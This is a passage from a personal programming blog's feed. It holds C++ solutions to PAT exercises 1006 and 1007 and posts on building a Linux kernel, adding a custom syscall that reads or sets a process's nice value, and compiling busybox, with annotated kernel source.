&#123;</span><br><span class="line"><span class="type">int</span> n, i, j, l, k = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line"></span><br><span class="line">i = n / <span class="number">100</span>;</span><br><span class="line">l = n % <span class="number">10</span>;</span><br><span class="line">n = n % <span class="number">100</span>;</span><br><span class="line">j = n / <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (k &lt;= i) &#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&#x27;B&#x27;</span>;</span><br><span class="line">k++;</span><br><span class="line">&#125;</span><br><span class="line">k = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span> (k &lt;= j) &#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&#x27;S&#x27;</span>;</span><br><span class="line">k++;</span><br><span class="line">&#125;</span><br><span class="line">k = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span> (k &lt;= l) &#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; k;</span><br><span class="line">k++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="1007-素数对猜想-（20-分）"><a href="#1007-素数对猜想-（20-分）" class="headerlink" title="1007 素数对猜想 （20 分）"></a>1007 素数对猜想 （20 分）</h2><hr><blockquote><p>让我们定义d<sub>n</sub>为：d<sub>n</sub> &#x3D; p<sub>n+1</sub> - p<sub>n</sub>,其中p<sub>i</sub>是第i个素数。显然有d<sub>1</sub> &#x3D; 1，且对于$n&gt;1$有d<sub>n</sub>是偶数。“素数对猜想”认为“存在无穷多对相邻且差为 2 的素数”。</p><p>现给定任意正整数<code>N</code>(&lt;10<sup>5</sup>)，请计算不超过<code>N</code>的满足猜想的素数对的个数。</p></blockquote><p><strong>输入格式:</strong></p><blockquote><p>输入在一行给出正整数<code>N</code>。</p></blockquote><p><strong>输出格式:</strong></p><blockquote><p>在一行中输出不超过<code>N</code>的满足猜想的素数对的个数。</p></blockquote><p><strong>输入样例:</strong></p><pre><code>20</code></pre><p><strong>输出样例:</strong></p><pre><code>4</code></pre><h4 id="C-6"><a href="#C-6" class="headerlink" title="C++"></a>C++</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cmath&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> n, k = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> a[<span class="number">100000</span>];</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line"><span class="type">int</span> j;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">2</span>; i &lt;= n; i++) &#123;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">2</span>; j &lt;= <span class="built_in">sqrt</span>(i); j++) &#123;</span><br><span class="line"><span class="keyword">if</span>(i % j == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(j &gt; <span class="built_in">sqrt</span>(i)) &#123;</span><br><span class="line">a[k++] = i;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> prime = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; k; i++) &#123;</span><br><span class="line"><span class="keyword">if</span>(a[i + <span class="number">1</span>] - a[i] == <span class="number">2</span>) &#123;</span><br><span class="line">prime++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; prime;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;em&gt;&lt;strong&gt;题目思路就先不写了，以后再补(咕咕咕)，现在只有代码&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>backup: Syscalls and problems encountered</title>
    <link href="http://aslin.site/2022/03/09/backup-Syscalls-and-problems-encountered/"/>
    <id>http://aslin.site/2022/03/09/backup-Syscalls-and-problems-encountered/</id>
    <published>2022-03-09T03:08:21.000Z</published>
    <updated>2022-12-26T14:43:03.810Z</updated>
    
    <content type="html"><![CDATA[<p>In the previous article, we finished setting up the kernel environment. Now let’s try to write a system call to modify or read the nice value of a given process and return the latest nice value and priority prio of the process.</p><span id="more"></span><h2 id="Successful-method"><a href="#Successful-method" class="headerlink" title="Successful method"></a>Successful method</h2><p>This is a successful method and seems to be the one most people use</p><p>First, go to <code>include/linux/syscalls.h</code> and add the following function prototype</p><p><img src="https://i.loli.net/2019/10/11/CUWtY8eIc3pLA2i.png" alt="image.png"></p><p>After that, go to <code>arch/x86/entry/syscalls/syscall_32.tbl</code> and <code>arch/x86/entry/syscalls/syscall_64.tbl</code> respectively and add the system call number</p><p><img src="https://i.loli.net/2019/10/11/fDSu4HFQITmdsEX.png" alt="image.png"></p><p>ps:Make sure to add <code>__ia32_</code> to <code>syscall_32.tbl</code> and <code>__x64_</code> to <code>syscall_64.tbl</code>, just like the picture above, otherwise you may get an error like <code>underfined reference to xxx</code>.</p><p>Add code in <code>kernel/sys.c</code></p><p><img src="https://i.loli.net/2019/10/11/v2seCxMulLaZBht.png" alt="image.png"></p><p>After that just <code>make -j8 bzImage</code> and wait for a few minutes</p><p>After compiling, write a demo to see if it works</p><p><img src="https://i.loli.net/2019/10/11/bfmVHDtSJzd47OY.png" alt="image.png"></p><p>Then use the script to make the rootfs.img and launch qemu</p><p><img src="https://i.loli.net/2019/10/11/wCnitzmFkyhZK31.png" alt="image.png"></p><p>Let’s talk about this syscall</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE5(lab1, <span class="type">pid_t</span>, pid, <span class="type">int</span>, flag, <span class="type">int</span>, nicevalue, <span class="type">void</span> __user *, prio, <span class="type">void</span> __user *, nice) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pid</span> * <span class="title">mypid</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> * <span class="title">task</span>;</span></span><br><span class="line"><span class="type">int</span> nice_before;</span><br><span class="line"><span class="type">int</span> nice_after;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// First, we use the function find_get_pid() here to get the struct_pid structure of the pid we are requesting</span></span><br><span class="line">mypid = find_get_pid(pid);</span><br><span class="line">    <span class="comment">// Then we use the pid_task() function to get the pid corresponding task_struct structure for task_nice() and set_user_nice()</span></span><br><span class="line">task = pid_task(mypid, PIDTYPE_PID);</span><br><span class="line">nice_before = task_nice(task);  <span class="comment">// Get the current nice value</span></span><br><span class="line"><span class="keyword">if</span>(flag == <span class="number">1</span>) &#123;</span><br><span class="line">set_user_nice(task, nicevalue);  <span class="comment">// Modify nice value</span></span><br><span class="line">printk(<span class="string">&quot;This is origin nice : %d\nThis is the nice now : %d\n&quot;</span>, nice_before, nicevalue);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(flag == <span class="number">0</span>) &#123;</span><br><span class="line">printk(<span class="string">&quot;The nice is : %d\n&quot;</span>, nice_before);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">copy_to_user(void __user *to, const void *from, unsigned long n)</span></span><br><span class="line"><span class="comment">The three parameters are the user memory address, the kernel space address and the data length</span></span><br><span class="line"><span class="comment"> * user memory address, use (int *)prio</span></span><br><span class="line"><span class="comment"> * Kernel space address, mainly about task_struct structure, use &amp;task_struct</span></span><br><span class="line"><span class="comment"> * Data length is the length of this prio, sizeof(task_prio)</span></span><br><span class="line"><span class="comment">The same goes for the nice value returned later</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"><span class="keyword">if</span>(copy_to_user((<span class="type">int</span> *)prio, &amp;task-&gt;prio, <span class="keyword">sizeof</span>(task-&gt;prio))) &#123;</span><br><span class="line"><span class="keyword">return</span> EFAULT;</span><br><span class="line">&#125;</span><br><span class="line">nice_after = task_nice(task);</span><br><span class="line"><span class="keyword">if</span>(copy_to_user((<span class="type">int</span> *)nice, &amp;nice_after, <span class="keyword">sizeof</span>(nice_after))) &#123;</span><br><span class="line"><span class="keyword">return</span> EFAULT;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>There seems to be a lot of questions though…. Didn’t think about the range of nice values when I first wrote it (didn’t even know nice values had a range).</p><h2 id="It’s-an-error-way-that-somehow-goes-wrong"><a href="#It’s-an-error-way-that-somehow-goes-wrong" class="headerlink" title="It’s an error way that somehow goes wrong"></a>It’s an error way that somehow goes wrong</h2><p>At first, I wanted to follow a tutorial on the Internet and try to write a method with parameters, similar to the one I wrote in the last blog about adding system calls.</p><p>Create <code>lab1_v2</code> folder in the root of the source code and add <code>lab1_v2.c</code> and <code>Makefile</code></p><p><img src="https://i.loli.net/2019/10/11/AbP95oHvd8zBNZw.png" alt="image.png"></p><p>Modify the <code>Makefile</code> file in the root directory of the source code</p><p><img src="https://i.loli.net/2019/10/11/Poy1enD354MLrBK.png" alt="image.png"></p><p>Complete the regular three-step <code>include/linux/syscalls.h</code>, <code>arch/x86/entry/syscalls/syscall_32.tbl</code> and <code>arch/x86/entry/syscalls/syscall_64.tbl</code></p><p><img src="https://i.loli.net/2019/10/11/CUWtY8eIc3pLA2i.png" alt="image.png"><br><img src="https://i.loli.net/2019/10/11/fDSu4HFQITmdsEX.png" alt="image.png"></p><p>Then compile the kernel <code>make -j8 bzImage</code></p><p>Written a demo as usual</p><p><img src="https://i.loli.net/2019/10/11/sHCO1f6bwk3hr7d.png" alt="image.png"></p><p>Then an error occurs when running</p><p><img src="https://i.loli.net/2019/10/11/VqLH7NOflsbhPJM.png" alt="image.png"></p><p>Probably something went wrong when passing parameters?</p><h2 id="Related-Source-Code"><a href="#Related-Source-Code" class="headerlink" title="Related Source Code"></a>Related Source Code</h2><p><strong>find_get_pid(int nr)</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pid</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">atomic_t</span> count;    <span class="comment">//Number of tasks currently using this process</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> level;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hlist_head</span> <span class="title">tasks</span>[<span class="title">PIDTYPE_MAX</span>]；  //<span class="title">List</span> <span class="title">of</span> <span class="title">tasks</span> <span class="title">that</span> <span class="title">use</span> <span class="title">this</span> <span class="title">process</span></span></span><br><span class="line"><span class="class">    <span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">upid</span> <span class="title">numbers</span>[1];</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">upid</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> nr;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pid_namespace</span> *<span class="title">ns</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hlist_node</span> <span class="title">pid_chain</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//find_get_pid(pid_t nr) is to get the process descriptor by the process number pid_t nr and add 1 to the count in the structure</span></span><br><span class="line"><span class="keyword">struct</span> pid *<span class="title function_">find_get_pid</span><span class="params">(<span class="type">pid_t</span> nr)</span>  </span><br><span class="line">&#123;  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">pid</span>;</span> </span><br><span class="line">    rcu_read_lock();  </span><br><span class="line">    pid = get_pid(find_vpid(nr));  </span><br><span class="line">    rcu_read_unlock();  </span><br><span class="line">    <span class="keyword">return</span> pid;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="comment">//其中，find_vpid(pid_t nr) returns the process descriptor, and get_pid(struct pid * kpid) adds 1 to count</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="keyword">struct</span> pid *<span class="title function_">get_pid</span><span class="params">(<span class="keyword">struct</span> pid *pid)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">if</span> (pid)</span><br><span class="line">                <span class="type">atomic_inc</span>(&amp;pid-&gt;count);</span><br><span class="line">        <span class="keyword">return</span> pid;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> pid *<span class="title function_">find_vpid</span><span class="params">(<span class="type">int</span> nr)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">return</span> find_pid_ns(nr, task_active_pid_ns(current));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>pid_task()</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Find pid_task by process descriptor</span></span><br><span class="line"><span class="keyword">struct</span> task_struct *<span class="title function_">pid_task</span><span class="params">(<span class="keyword">struct</span> pid *pid, <span class="keyword">enum</span> pid_type type)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">result</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">if</span> (pid) &#123;</span><br><span class="line">                <span class="class"><span class="keyword">struct</span> <span class="title">hlist_node</span> *<span class="title">first</span>;</span></span><br><span class="line">                first = rcu_dereference_check(hlist_first_rcu(&amp;pid-&gt;tasks[type]),</span><br><span class="line">                                              lockdep_tasklist_lock_is_held());</span><br><span class="line">                <span class="keyword">if</span> (first)</span><br><span class="line">                        result = hlist_entry(first, <span class="keyword">struct</span> task_struct, pids[(type)].node);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>asmlinkage</strong><br>Inform the compiler to extract the function parameters from the stack only, not from the registers, because the system has already pressed the parameter values passed through the registers into the kernel stack before executing the service routine</p><p><strong>set_user_nice()</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">set_user_nice</span><span class="params">(<span class="keyword">struct</span> task_struct *p, <span class="type">long</span> nice)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">bool</span> queued, running;</span><br><span class="line"><span class="type">int</span> old_prio, delta;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rq_flags</span> <span class="title">rf</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rq</span> *<span class="title">rq</span>;</span></span><br><span class="line">    <span class="comment">// rq is the ready queue, which is designed to be one ready queue per cpu, with local processes sorted on the local queue</span></span><br><span class="line"><span class="comment">// If the current task&#x27;s nice value is already equal to the nice value to be set, just exit</span></span><br><span class="line"><span class="comment">// From here we can see that the nice values range from -20 to 19</span></span><br><span class="line"><span class="keyword">if</span> (task_nice(p) == nice || nice &lt; MIN_NICE || nice &gt; MAX_NICE)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We have to be careful, if called from sys_setpriority(),</span></span><br><span class="line"><span class="comment"> * the task might be in the middle of scheduling on another CPU.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">rq = task_rq_lock(p, &amp;rf);</span><br><span class="line">update_rq_clock(rq);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The RT priorities are set via sched_setscheduler(), but we still</span></span><br><span class="line"><span class="comment"> * allow the &#x27;normal&#x27; nice value to be set - but as expected</span></span><br><span class="line"><span class="comment"> * it wont have any effect on scheduling until the task is</span></span><br><span class="line"><span class="comment"> * SCHED_DEADLINE, SCHED_FIFO or SCHED_RR:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">// If the current process is a real-time process, </span></span><br><span class="line">    <span class="comment">// the scheduling strategy for real-time processes can also be divided into deadline/fifo/rr.</span></span><br><span class="line"><span class="comment">// Setting the nice value for real-time processes is actually useless, </span></span><br><span class="line">    <span class="comment">// but here it is still set to p-&gt;static_prio after converting the nice value to priority </span></span><br><span class="line"><span class="keyword">if</span> (task_has_dl_policy(p) || task_has_rt_policy(p)) &#123;</span><br><span class="line">p-&gt;static_prio = NICE_TO_PRIO(nice);<span class="comment">// Change priority by edit nice value</span></span><br><span class="line"><span class="keyword">goto</span> out_unlock;</span><br><span class="line">&#125;</span><br><span class="line">queued = task_on_rq_queued(p);</span><br><span class="line">running = task_current(rq, p);</span><br><span class="line"><span class="keyword">if</span> (queued)</span><br><span class="line">dequeue_task(rq, p, DEQUEUE_SAVE | DEQUEUE_NOCLOCK);</span><br><span class="line"><span class="keyword">if</span> (running)</span><br><span class="line">put_prev_task(rq, p);</span><br><span class="line"><span class="comment">// Set the nice value to priority in static_prio, #define NICE_TO_PRIO(nice) ((nice) + DEFAULT_PRIO)</span></span><br><span class="line"><span class="comment">// The DEFAULT_PRIO value here is calculated to be 120.</span></span><br><span class="line"><span class="comment">// From here you can also see that the priority-to-nice value should be subtracted from DEFAULT_PRIO </span></span><br><span class="line">    <span class="comment">// #define PRIO_TO_NICE(prio) ((prio) - DEFAULT_PRIO)</span></span><br><span class="line"> </span><br><span class="line">p-&gt;static_prio = NICE_TO_PRIO(nice);</span><br><span class="line">set_load_weight(p);</span><br><span class="line">old_prio = p-&gt;prio;</span><br><span class="line">p-&gt;prio = effective_prio(p);</span><br><span class="line">delta = p-&gt;prio - old_prio;</span><br><span class="line"><span class="comment">// If the task of the nice to be set is in the queue</span></span><br><span class="line"><span class="keyword">if</span> (queued) &#123;</span><br><span class="line">enqueue_task(rq, p, ENQUEUE_RESTORE | ENQUEUE_NOCLOCK);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If the task increased its priority or is running and</span></span><br><span class="line"><span class="comment"> * lowered its priority, then reschedule its CPU:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">// Reschedule rq if priority is increased and task is running or if priority is decreased.</span></span><br><span class="line"><span class="keyword">if</span> (delta &lt; <span class="number">0</span> || (delta &gt; <span class="number">0</span> &amp;&amp; task_running(rq, p)))</span><br><span class="line">resched_curr(rq);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// If the task to set the nice value is running, and since we are changing the priority of p here, reassign the task&#x27;s rq.</span></span><br><span class="line"><span class="keyword">if</span> (running)</span><br><span class="line">set_curr_task(rq, p);</span><br><span class="line">    out_unlock:</span><br><span class="line">task_rq_unlock(rq, p, &amp;rf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;In the previous article, we finished setting up the kernel environment. Now let’s try to write a system call to modify or read the nice value of a given process and return the latest nice value and priority prio of the process.&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>backup: Configuring the kernel environment from scratch</title>
    <link href="http://aslin.site/2022/03/09/backup-Configuring-the-kernel-environment-from-scratch/"/>
    <id>http://aslin.site/2022/03/09/backup-Configuring-the-kernel-environment-from-scratch/</id>
    <published>2022-03-09T02:46:36.000Z</published>
    <updated>2022-12-26T14:43:03.810Z</updated>
    
    <content type="html"><![CDATA[<p>Configuring kernel environment</p><span id="more"></span><h2 id="Compiling-kernel"><a href="#Compiling-kernel" class="headerlink" title="Compiling kernel"></a>Compiling kernel</h2><ol><li><p>Download kernel source code: <a href="https://www.kernel.org/">https://www.kernel.org/</a></p></li><li><p>Install necessary dependencies</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install git fakeroot build-essential ncurses-dev xz-utils libssl-dev bc</span><br></pre></td></tr></table></figure></li><li><p>Unzip and enter the directory</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make menuconfig</span><br></pre></td></tr></table></figure><p>ps: There may be errors that require flex and bison, apt-get install can fix them</p><p>Nothing should be changed, just save</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">enter kernel hacking</span><br><span class="line">Select the following items</span><br><span class="line"> Kernel debugging</span><br><span class="line"> Compile-time checks and compiler options —&gt; Compile the kernel with debug info和Compile the kernel with frame pointers</span><br><span class="line"> KGDB</span><br><span class="line">Then save and <span class="built_in">exit</span></span><br></pre></td></tr></table></figure><p>ps: Remember not to make the terminal window too small when <code>make menuconfig</code>. Otherwise you will be prompted and not allowed to complete the next steps.</p></li><li><p>&#96;&#96;&#96;bash<br>make bzImage</p><p>Setup is 17244 bytes (padded to 17408 bytes).<br>System is 7666 kB<br>CRC 5c77cbfe<br>Kernel: arch&#x2F;x86&#x2F;boot&#x2F;bzImage is ready  (#1)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">### Add a simple syscall</span><br><span class="line"></span><br><span class="line">Helloworld again</span><br><span class="line"></span><br><span class="line">Create a `helloworld` directory in the root of the source code</span><br><span class="line"></span><br><span class="line">```bash</span><br><span class="line">$ pwd</span><br><span class="line">/home/test/test_kernel/linux-xxxxxxx/helloworld</span><br><span class="line">$ tree</span><br><span class="line">.</span><br><span class="line">├── helloworld.c</span><br><span class="line">└── Makefile</span><br><span class="line">$ cat helloworld.c    </span><br><span class="line">#include &lt;linux/kernel.h&gt;</span><br><span class="line"></span><br><span class="line">asmlinkage long sys_helloworld(void)&#123;</span><br><span class="line">printk(&quot;&#123;==kernel==&#125; hello world\n&quot;);</span><br><span class="line">return 0;</span><br><span class="line">&#125; </span><br><span class="line">$ cat Makefile    </span><br><span class="line">obj-y=helloworld.o</span><br></pre></td></tr></table></figure></li></ol><p>Then go to the <code>Makefile</code> in the root of the source code and add <code>helloworld/</code></p><p><img src="https://i.loli.net/2019/10/05/rCUj7B1JVSNseaO.png" alt="1570110418013.png"></p><p>Then go to <code>include/linux/syscalls.h</code> and add the function prototype</p><p><img src="https://i.loli.net/2019/10/05/L91tqBeSju4kDbJ.png" alt="1570110666526.png"></p><p>Add system call numbers to <code>arch/x86/entry/syscalls/syscall_32.tbl</code> and <code>arch/x86/entry/syscalls/syscall_64.tbl</code></p><p><img src="https://i.loli.net/2019/10/05/GORckSDuIxXKzHd.png" alt="1570110860880.png"></p><p><img src="https://i.loli.net/2019/10/05/Ec4nVZ7RxNekmjp.png" alt="1570111062848.png"></p><p>After that, compile the kernel</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make bzImage</span><br></pre></td></tr></table></figure><p>It will be able to get <code>bzImage</code> in <code>./arch/x86/boot/</code></p><h2 id="Compile-busybox"><a href="#Compile-busybox" class="headerlink" title="Compile busybox"></a>Compile busybox</h2><p>As usual, download from the official website <a href="https://busybox.net/">https://busybox.net/</a></p><p>Unzip and enter the directory</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make menuconfig</span><br></pre></td></tr></table></figure><p>Selected <code>Build static binary (no shared libs)</code> within Settings</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make install</span><br></pre></td></tr></table></figure><p>After compiling, a <code>_install</code> directory will appear, then:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 